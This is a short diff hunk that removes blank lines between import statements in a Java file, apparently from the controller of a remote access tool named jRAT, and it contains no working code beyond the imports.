@@ -5,11 +5,9 @@ import io.jrat.controller.Main;
 import io.jrat.controller.SampleMode;
 import io.jrat.controller.Slave;
 import io.jrat.controller.packets.outgoing.AbstractOutgoingPacket;
-
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
-
 import jrat.api.Client;
 import jrat.api.net.Connection;
 import jrat.api.net.PacketBuilder;
